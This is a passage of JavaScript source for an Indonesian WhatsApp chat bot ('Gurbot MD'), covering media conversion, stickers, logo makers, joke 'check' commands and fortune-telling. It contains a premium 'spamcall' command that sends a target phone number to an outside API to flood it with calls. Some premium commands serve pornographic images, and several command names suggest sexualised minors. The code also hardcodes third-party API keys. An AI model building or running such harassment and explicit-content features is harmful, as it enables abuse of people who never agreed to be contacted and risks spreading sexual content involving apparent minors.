          return conn.sendMessage(from, buta_menu);
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "sticker",
            `./sticker/${sender.split("@")[0]}.webp`
          );
          reply(mess.wait);
          let buffer_up = fs.readFileSync(
            `./sticker/${sender.split("@")[0]}.webp`
          );
          var rand2 = "sticker/" + getRandom(".webp");
          fs.writeFileSync(`./${rand2}`, buffer_up);
          var { name, url, size } = await UploadFileUgu(rand2);
          let sizeNy = bytesToSize(size);
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`;
          conn.sendMessage(from, { text: teks }, { quoted: msg });
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`);
          fs.unlinkSync(rand2);
        } else if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "video",
            `./sticker/${sender.split("@")[0]}.mp4`
          );
          reply(mess.wait);
          let buffer_up = fs.readFileSync(
            `./sticker/${sender.split("@")[0]}.mp4`
          );
          var rand2 = "sticker/" + getRandom(".mp4");
          fs.writeFileSync(`./${rand2}`, buffer_up);
          var { name, url, size } = await UploadFileUgu(rand2);
          let sizeNy = bytesToSize(size);
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`;
          conn.sendMessage(from, { text: teks }, { quoted: msg });
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`);
          fs.unlinkSync(rand2);
        } else if (isImage || isQuotedImage) {
          var mediany = await conn.downloadAndSaveMediaMessage(
            msg,
            "image",
            `./sticker/${sender.split("@")[0]}.jpg`
          );
          reply(mess.wait);
          let buffer_up = fs.readFileSync(mediany);
          var rand2 = "sticker/" + getRandom(".png");
          fs.writeFileSync(`./${rand2}`, buffer_up);
          var { name, url, size } = await UploadFileUgu(rand2);
          let sizeNy = bytesToSize(size);
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`;
          conn.sendMessage(from, { text: teks }, { quoted: msg });
          fs.unlinkSync(mediany);
          fs.unlinkSync(rand2);
        } else if (isQuotedAudio) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "audio",
            `./sticker/${sender.split("@")[0]}.mp3`
          );
          reply(mess.wait);
          let buffer_up = fs.readFileSync(
            `./sticker/${sender.split("@")[0]}.mp3`
          );
          var rand2 = "sticker/" + getRandom(".mp3");
          fs.writeFileSync(`./${rand2}`, buffer_up);
          var { name, url, size } = await UploadFileUgu(rand2);
          let sizeNy = bytesToSize(size);
          var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`;
          conn.sendMessage(from, { text: teks }, { quoted: msg });
          fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`);
          fs.unlinkSync(rand2);
        } else {
          reply(
            `*reply audio/video/sticker/gambar dengan pesan ${
              prefix + command
            }*`
          );
        }
        break;
      case "tomp3":
      case "toaudio":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "video",
            `./sticker/${sender.split("@")[0]}.mp4`
          );
          reply(mess.wait);
          var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`);
          let ran = "./sticker/" + getRandom(".mp3");
          fs.writeFileSync(`./${ran}`, media);
          exec(`ffmpeg -i ${media} ${ran}`);
          conn.sendMessage(
            from,
            {
              audio: fs.readFileSync(ran),
              mimetype: "audio/mp4",
              fileName: `${sender.split("@")[0]}ToMp3`,
              ptt: args[1] == "--ptt" ? true : false,
            },
            { quoted: msg }
          );
          fs.unlinkSync(ran);
          fs.unlinkSync(media);
        } else {
          reply(`*Reply video dengan pesan ${prefix + command}*`);
        }
        confirmlimit(sender, 1);
        break;
      case "base64":
      case "base32":
        {
          if (!q) return reply(`Example :\n${prefix + command} Lexxy`);
          reply(mess.wait);
          var yogi = await fetchJson(
            `https://api-yogipw.herokuapp.com/api/base?type=${command}&encode=${q}`
          );
          var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.encode}
 *string:* ${yogi.result.string}`;
          reply(text_encode);
        }
        confirmlimit(sender, 1);
        break;
      case "debase64":
        {
          if (!q) return reply(`Example :\n${prefix + command} cA==`);
          reply(mess.wait);
          var yogi = await fetchJson(
            `https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${q}`
          );
          var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`;
          reply(text_encode);
        }
        confirmlimit(sender, 1);
        break;
      case "debase32":
        {
          reply(mess.wait);
          var yogi = await fetchJson(
            `https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${q}`
          );
          var text_encode = `*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`;
          reply(text_encode);
        }
        confirmlimit(sender, 1);
        break;

      // CONVERT
      case "toimg":
      case "toimage":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "sticker",
            `./sticker/${sender.split("@")[0]}.webp`
          );
          let buffer = fs.readFileSync(
            `./sticker/${sender.split("@")[0]}.webp`
          );
          var rand1 = "sticker/" + getRandom(".webp");
          var rand2 = "sticker/" + getRandom(".png");
          fs.writeFileSync(`./${rand1}`, buffer);
          reply(mess.wait);
          exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
            fs.unlinkSync(`./${rand1}`);
            if (err) return reply(mess.error.api);
            conn.sendMessage(
              from,
              {
                caption: `*Sticker Convert To Image!*`,
                image: fs.readFileSync(`./${rand2}`),
              },
              { quoted: msg }
            );
            fs.unlinkSync(`./${rand2}`);
            fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`);
          });
        } else {
          reply(
            "*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*"
          );
        }
        confirmlimit(sender, 1);
        break;
      case "tomp4":
      case "tovideo":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (isSticker || isQuotedSticker) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "sticker",
            `./sticker/${sender.split("@")[0]}.webp`
          );
          let buffer = `./sticker/${sender.split("@")[0]}.webp`;
          reply(mess.wait);
          let webpToMp4 = await webp2mp4File(buffer);
          conn.sendMessage(
            from,
            {
              video: { url: webpToMp4.result },
              caption: "Convert Webp To Video",
            },
            { quoted: msg }
          );
          fs.unlinkSync(buffer);
        } else {
          reply("*Reply sticker gif dengan pesan #tovideo*");
        }
        confirmlimit(sender, 1);
        break;
      case "emojimix":
      case "mixemoji":
      case "emojmix":
      case "emojinua":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q)
          return reply(
            `Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`
          );
        if (!q.includes("+"))
          return reply(`Format salah, contoh pemakaian !${command} 😅+😭`);
        var emo1 = q.split("+")[0];
        var emo2 = q.split("+")[1];
        if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`);
        fetchJson(
          `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
            emo1
          )}_${encodeURIComponent(emo2)}`
        )
          .then((data) => {
            var opt = { packname: "Gurbot MD", author: "By Lexxy" };
            conn.sendImageAsSticker(from, data.results[0].url, msg, opt);
          })
          .catch((e) => reply(mess.error.api));
        confirmlimit(sender, 1);
        break;
      case "emojimix2":
      case "mixemoji2":
      case "emojmix2":
      case "emojinua2":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`Example : ${prefix + command} 😅`);
          let anu = await fetchJson(
            `https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(
              q
            )}`
          );
          for (let res of anu.results) {
            var opt = { packname: "Gurbot MD", author: "By Lexxy" };
            let encmedia = await conn.sendImageAsSticker(
              from,
              res.url,
              msg,
              opt
            );
          }
        }
        confirmlimit(sender, 1);
        break;
      case "smeme":
      case "stikermeme":
      case "stickermeme":
      case "memestiker":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        var atas = q.split("|")[0];
        var bawah = q.split("|")[1];
        if (!atas)
          return reply(
            `Kirim gambar dengan caption ${
              prefix + command
            } text_atas|text_bawah atau balas gambar yang sudah dikirim`
          );
        if (!bawah)
          return reply(
            `Kirim gambar dengan caption ${
              prefix + command
            } text_atas|text_bawah atau balas gambar yang sudah dikirim`
          );
        if (isImage || isQuotedImage) {
          reply(mess.wait);
          var media = await conn.downloadAndSaveMediaMessage(
            msg,
            "image",
            `./sticker/${sender.split("@")[0]}.jpg`
          );
          var media_url = (await UploadFileUgu(media)).url;
          var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(
            atas
          )}/${encodeURIComponent(bawah)}.png?background=${media_url}`;
          var opt = { packname: "Gurbot MD", author: "By Lexxy" };
          conn.sendImageAsSticker(from, meme_url, msg, opt);
          fs.unlinkSync(media);
        } else {
          reply(
            `Kirim gambar dengan caption ${
              prefix + command
            } text_atas|text_bawah atau balas gambar yang sudah dikirim`
          );
        }
        confirmlimit(sender, 1);
        break;
      case "swm":
      case "stikerwm":
      case "stickerwm":
      case "takesticker":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
        if (!q)
          return reply(
            `Kirim video/foto dengan caption ${
              prefix + command
            } packname|author atau balas video/foto yang sudah dikirim`
          );
        var pname = q.split("|")[0];
        var athor = q.split("|")[1];
        reply(mess.wait);
        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "image",
            `./sticker/${sender.split("@")[0]}.jpeg`
          );
          var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`);
          reply(mess.wait);
          var opt = { packname: pname, author: athor };
          conn.sendImageAsSticker(from, media, msg, opt);
          fs.unlinkSync(media);
        } else if (isVideo || isQuotedVideo) {
          reply(mess.wait);
          var media = await conn.downloadAndSaveMediaMessage(
            msg,
            "video",
            `./sticker/${sender}.jpeg`
          );
          var opt = { packname: pname, author: athor };
          conn.sendImageAsSticker(from, media, msg, opt);
          fs.unlinkSync(media);
        } else {
          reply(
            `Kirim video/foto dengan caption ${
              prefix + command
            } packname|author atau balas video/foto yang sudah dikirim`
          );
        }
        break;
      case "sticker":
      case "s":
      case "stiker":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "image",
            `./sticker/${sender.split("@")[0]}.jpeg`
          );
          let buffer = fs.readFileSync(
            `./sticker/${sender.split("@")[0]}.jpeg`
          );
          reply(mess.wait);
          var rand1 = "sticker/" + getRandom(".jpeg");
          var rand2 = "sticker/" + getRandom(".webp");
          fs.writeFileSync(`${rand1}`, buffer);
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(
                `webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`,
                async (error) => {
                  conn.sendMessage(
                    from,
                    { sticker: fs.readFileSync(`./${rand2}`) },
                    { quoted: msg }
                  );
                  fs.unlinkSync(`./${rand1}`);
                  fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`);
                  fs.unlinkSync(`./${rand2}`);
                }
              );
            })
            .addOutputOptions([
              "-vcodec",
              "libwebp",
              "-vf",
              "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",
            ])
            .toFormat("webp")
            .save(`${rand2}`);
        } else {
          reply(
            `Kirim gambar dengan caption ${
              prefix + command
            } atau balas gambar yang sudah dikirim`
          );
        }
        confirmlimit(sender, 1);
        break;
      case "sgif":
      case "stickergif":
      case "stikergif":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (
          (isVideo && msg.message.videoMessage.seconds < 10) ||
          (isQuotedVideo && quotedMsg.videoMessage.seconds < 10)
        ) {
          await conn.downloadAndSaveMediaMessage(
            msg,
            "video",
            `./sticker/${sender.split("@")[0]}.mp4`
          );
          let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`);
          reply(mess.wait);
          var rand1 = "sticker/" + getRandom(".mp4");
          var rand2 = "sticker/" + getRandom(".webp");
          fs.writeFileSync(`${rand1}`, buffer);
          ffmpeg(`./${rand1}`)
            .on("error", console.error)
            .on("end", () => {
              exec(
                `webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`,
                async (error) => {
                  conn.sendMessage(
                    from,
                    { sticker: fs.readFileSync(`./${rand2}`) },
                    { quoted: msg }
                  );
                  fs.unlinkSync(`./${rand1}`);
                  fs.unlinkSync(`./${rand2}`);
                  fs.unlinkSync(buffer);
                }
              );
            })
            .addOutputOptions([
              "-vcodec",
              "libwebp",
              "-vf",
              "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse",
            ])
            .toFormat("webp")
            .save(`${rand2}`);
        } else {
          reply(
            `Kirim video dengan caption ${
              prefix + command
            } atau balas video yang sudah dikirim`
          );
        }
        confirmlimit(sender, 1);
        break;
      case "cekjelek":
      case "cekcantik":
      case "cekganteng":
      case "ceksad":
      case "cekharam":
      case "cekhalal":
      case "cekbego":
      case "cekanjing":
      case "cekbiadab":
      case "cekramah":
      case "ceksatir":
      case "cekmanis":
      case "cekpahit":
      case "cekhitam":
      case "cekrasis":
      case "cekbaik":
      case "cekjahat":
      case "cekkaya":
      case "cekmiskin":
      case "cekpintar":
      case "cekbodoh":
      case "cekimut":
      case "cekkocak":
      case "cekkadang":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        let x25 = `./sticker/cekStats_Now.webp`;
        let x26 = `./sticker/cekStats_Yes.webp`;
        const x27 = [true, false][
          Math.floor(Math.random() * [true, false].length)
        ];
        if (x27 == true) {
          conn.sendMessage(
            from,
            { sticker: { url: x25 } },
            {
              quoted: {
                key: {
                  fromMe: false,
                  participant: `${sender}`,
                  ...(from ? { remoteJid: "status@broadcast" } : {}),
                },
                message: {
                  conversation: `[❎] Kamu tidak ${body
                    .slice(4)
                    .trim()
                    .split(/ +/)
                    .shift()
                    .toLowerCase()} sama sekali🥴`,
                },
              },
            }
          );
        }
        if (x27 == false) {
          conn.sendMessage(
            from,
            { sticker: { url: x26 } },
            {
              quoted: {
                key: {
                  fromMe: false,
                  participant: `${sender}`,
                  ...(from ? { remoteJid: "status@broadcast" } : {}),
                },
                message: {
                  conversation: `[✅] Ya begitulah, Kamu Sangat ${body
                    .slice(4)
                    .trim()
                    .split(/ +/)
                    .shift()
                    .toLowerCase()} Sekali 🤥`,
                },
              },
            }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "goblokcek":
      case "jelekcek":
      case "gaycek":
      case "lesbicek":
      case "gantengcek":
      case "cantikcek":
      case "begocek":
      case "suhucek":
      case "pintercek":
      case "jagocek":
      case "nolepcek":
      case "babicek":
      case "bebancek":
      case "baikcek":
      case "jahatcek":
      case "anjingcek":
      case "haramcek":
      case "pakboycek":
      case "pakgirlcek":
      case "sangecek":
      case "bapercek":
      case "fakboycek":
      case "alimcek":
      case "suhucek":
      case "fakgirlcek":
      case "kerencek":
      case "wibucek":
      case "pasarkascek":
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        const eyy = [
          "1",
          "2",
          "3",
          "4",
          "5",
          "6",
          "7",
          "8",
          "9",
          "10",
          "11",
          "12",
          "13",
          "14",
          "15",
          "16",
          "17",
          "18",
          "19",
          "20",
          "21",
          "22",
          "23",
          "24",
          "25",
          "26",
          "27",
          "28",
          "29",
          "30",
          "31",
          "32",
          "33",
          "34",
          "35",
          "36",
          "37",
          "38",
          "39",
          "40",
          "41",
          "42",
          "43",
          "44",
          "45",
          "46",
          "47",
          "48",
          "49",
          "50",
          "51",
          "52",
          "53",
          "54",
          "55",
          "56",
          "57",
          "58",
          "59",
          "60",
          "61",
          "62",
          "63",
          "64",
          "65",
          "66",
          "67",
          "68",
          "69",
          "70",
          "71",
          "72",
          "73",
          "74",
          "75",
          "76",
          "77",
          "78",
          "79",
          "80",
          "81",
          "82",
          "83",
          "84",
          "85",
          "86",
          "87",
          "88",
          "89",
          "90",
          "91",
          "92",
          "93",
          "94",
          "95",
          "96",
          "97",
          "98",
          "99",
          "100",
        ];
        const yn = eyy[Math.floor(Math.random() * eyy.length)];
        conn.sendMessage(from, { text: `${yn}%` }, { quoted: msg });
        confirmlimit(sender, 1);
        break;
      // TEXTPRO
      case "blackpink":
      case "neon":
      case "greenneon":
      case "advanceglow":
      case "futureneon":
      case "sandwriting":
      case "sandsummer":
      case "sandengraved":
      case "metaldark":
      case "neonlight":
      case "holographic":
      case "text1917":
      case "minion":
      case "deluxesilver":
      case "newyearcard":
      case "bloodfrosted":
      case "halloween":
      case "jokerlogo":
      case "fireworksparkle":
      case "natureleaves":
      case "bokeh":
      case "toxic":
      case "strawberry":
      case "box3d":
      case "roadwarning":
      case "breakwall":
      case "icecold":
      case "luxury":
      case "cloud":
      case "summersand":
      case "horrorblood":
      case "thunder":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`_Contoh_\n${prefix + command} nama`);
          reply(mess.wait);
          conn.sendMessage(
            from,
            {
              image: {
                url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${setting.api_lolkey}&text=${q}`,
              },
              caption: `Nih ${command}📸`,
            },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      // PHOTOOXY
      case "metallic":
      case "naruto":
      case "butterfly":
      case "flaming":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`_Contoh_\n${prefix + command} nama`);
          reply(mess.wait);
          let photooxy = `https://api.nataganz.com/api/photooxy/${command}?text=${q}&apikey=Pasha`;
          conn.sendMessage(
            from,
            { image: { url: photooxy }, caption: `Hasil dari ${command}` },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "wetglass":
      case "multicolor3d":
      case "watercolor":
      case "luxurygold":
      case "galaxywallpaper":
      case "lighttext":
      case "beautifulflower":
      case "puppycute":
      case "royaltext":
      case "heartshaped":
      case "birthdaycake":
      case "galaxystyle":
      case "hologram3d":
      case "greenneon":
      case "glossychrome":
      case "greenbush":
      case "metallogo":
      case "noeltext":
      case "glittergold":
      case "textcake":
      case "starsnight":
      case "wooden3d":
      case "textbyname":
      case "writegalacy":
      case "galaxybat":
      case "snow3d":
      case "birthdayday":
      case "goldplaybutton":
      case "silverplaybutton":
      case "freefire":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) reply(`Contoh: #${command} nama`);
          reply(mess.wait);
          conn.sendMessage(
            from,
            {
              image: {
                url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${setting.api_lolkey}&text=${q}`,
              },
              caption: `Nih ${command}📸`,
            },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "shadow":
      case "cup":
      case "cup1":
      case "romance":
      case "smoke":
      case "burnpaper":
      case "lovemessage":
      case "undergrass":
      case "love":
      case "coffe":
      case "woodheart":
      case "woodenboard":
      case "summer3d":
      case "wolfmetal":
      case "nature3d":
      case "underwater":
      case "goldenrose":
      case "summernature":
      case "letterleaves":
      case "glowingneon":
      case "fallleaves":
      case "flamming":
      case "harrypotter":
      case "carvedwood":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) reply(`Contoh: #${command} nama`);
          reply(mess.wait);
          conn.sendMessage(
            from,
            {
              image: {
                url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${setting.api_lolkey}&text=${q}`,
              },
              caption: `Nih ${command}📸`,
            },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      case "boneka":
      case "cecan":
      case "cogan":
      case "darkjokes":
      case "islamic":
      case "mobil":
      case "programing":
      case "tatasurya":
      case "wallhp":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        const x35 = JSON.parse(
          fs.readFileSync(`./function/Random_IMAGE/${command}.json`)
        );
        const x36 = x35[Math.floor(Math.random() * x35.length)];
        conn.sendMessage(
          from,
          { image: { url: x36 }, caption: "Done!", mentions: [sender] },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;

      // PREMIUM ONLY
      // BIAR GAK DI SPAM

      case "bocil":
      case "ukhty":
      case "santuy":
      case "rika":
      case "hijaber":
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
        reply(mess.wait);
        const x33 = JSON.parse(
          fs.readFileSync(`./function/Random_IMAGE/${command}.json`)
        );
        const x34 = x33[Math.floor(Math.random() * x33.length)];
        conn.sendMessage(
          from,
          { video: { url: x34.url }, caption: "Done!", mentions: [sender] },
          { quoted: msg }
        );
        break;
      case "chiisaihentai":
      case "trap":
      case "blowjob":
      case "yaoi":
      case "ecchi":
      case "ahegao":
      case "hololewd":
      case "sideoppai":
      case "animefeets":
      case "animebooty":
      case "animethighss":
      case "hentaiparadise":
      case "animearmpits":
      case "hentaifemdom":
      case "lewdanimegirls":
      case "biganimetiddies":
      case "animebellybutton":
      case "hentai4everyone":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
          reply(mess.wait);
          conn.sendMessage(
            from,
            {
              image: {
                url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${setting.api_lolkey}`,
              },
              caption: `Nih ${command}📸`,
            },
            { quoted: msg }
          );
        }
        break;
      case "bj":
      case "ero":
      case "cum":
      case "feet":
      case "yuri":
      case "trap":
      case "lewd":
      case "feed":
      case "eron":
      case "solo":
      case "gasm":
      case "poke":
      case "anal":
      case "holo":
      case "tits":
      case "kuni":
      case "kiss":
      case "erok":
      case "smug":
      case "baka":
      case "solog":
      case "feetg":
      case "lewdk":
      case "waifu":
      case "pussy":
      case "femdom":
      case "cuddle":
      case "hentai":
      case "eroyuri":
      case "cum_jpg":
      case "blowjob":
      case "erofeet":
      case "holoero":
      case "classic":
      case "erokemo":
      case "fox_girl":
      case "futanari":
      case "lewdkemo":
      case "wallpaper":
      case "pussy_jpg":
      case "kemonomimi":
      case "nsfw_avatar":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
          reply(mess.wait);
          conn.sendMessage(
            from,
            {
              image: {
                url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${setting.api_lolkey}`,
              },
              caption: `Nih ${command}📸`,
            },
            { quoted: msg }
          );
        }
        break;
      case "spamcall":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
          if (!q)
            return reply(
              `Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`
            );
          var data = await fetchJson(
            `https://arugaz.herokuapp.com/api/spamcall?no=${q}`
          ).catch(() => reply(mess.error.api));
          if (data.status == false) {
            reply(data.msg);
          } else {
            reply(data.logs);
          }
        }
        break;
      // LOGO MAKER
      case "girlneko":
      case "gilrneko":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q1 && !q2)
          return reply("Masukkan text1&text2\nContoh? #girlneko aku&kamu");
        reply("[❗] SEDANG DIPROSES");
        conn.sendMessage(
          from,
          {
            image: {
              url: `https://ziy.herokuapp.com/api/maker/girlneko?text1=${q1}&text2=${q2}&apikey=xZiyy`,
            },
            caption: "done!!",
            mentions: [sender],
          },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;
      case "sadboy":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q1 && !q2)
          return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu");
        reply("[❗] SEDANG DIPROSES");
        conn.sendMessage(
          from,
          {
            image: {
              url: `https://ziy.herokuapp.com/api/maker/sadboy?text1=${q1}&text2=${q2}&apikey=xZiyy`,
            },
            caption: "done!!",
            mentions: [sender],
          },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;
      case "kaneki":
      case "rem":
      case "lolimaker":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!q) return reply(`Masukkan text\nContoh: #${command} bot`);
        reply("[❗] SEDANG DIPROSES");
        conn.sendMessage(
          from,
          {
            image: {
              url: `https://ziy.herokuapp.com/api/maker/${command}?nama=${q}&apikey=xZiyy`,
            },
            caption: "done!!",
            mentions: [sender],
          },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;
      case "waifu":
      case "lick":
      case "kiss":
      case "awoo":
      case "hug":
      case "cry":
      case "cuddle":
      case "bully":
      case "megumin":
      case "shinobu":
      case "neko":
      case "slap":
      case "wink":
      case "dance":
      case "poke":
      case "glomp":
      case "bite":
      case "nom":
      case "handhold":
      case "highfive":
      case "wave":
      case "smile":
      case "yeet":
      case "bonk":
      case "smug":
      case "pat":
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
        reply("[❗] SEDANG DIPROSES");
        fetchJson(`https://api.waifu.pics/sfw/${command}`).then((x) => {
          conn.sendMessage(
            from,
            { image: { url: x.url }, caption: "Done!!", mentions: [sender] },
            { quoted: msg }
          );
        });
        break;
      case "dadu":
      case "patrick":
      case "amongus":
      case "gawrgura":
      case "anjing":
      case "bucinstick":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(mess.wait);
          let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=${setting.api_lolkey}`;
          conn.sendMessage(
            from,
            { sticker: { url: buffer }, mimetype: "image/webp" },
            { quoted: msg }
          );
        }
        confirmlimit(sender, 1);
        break;
      // PRIMBON
      case "ramalanjodoh":
      case "ramaljodoh":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q)
            return reply(
              `Example :\n${
                prefix + command
              } Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`
            );
          let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`;
          let anu = await primbon.ramalan_jodoh(
            nama1,
            tgl1,
            bln1,
            thn1,
            nama2,
            tgl2,
            bln2,
            thn2
          );
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`
          );
        }
        break;
      case "nomorhoki":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q) return reply(`Example :\n${prefix + command} 6288292024190`);
          let anu = await primbon.nomer_hoki(q);
          if (anu.status == false) return reply(anu.message);
          reply(
            `> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`
          );
        }
        break;
      case "artimimpi":
      case "tafsirmimpi":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q) return reply(`Example :\n${prefix + command} belanja`);
          let anu = await primbon.tafsir_mimpi(q);
          if (anu.status == false) return m.reply(anu.message);
          reply(
            `> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`
          );
        }
        break;
      case "ramalanjodohbali":
      case "ramaljodohbali":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (!q)
            return reply(
              `Example :\n${
                prefix + command
              } Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`
            );
          let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`;
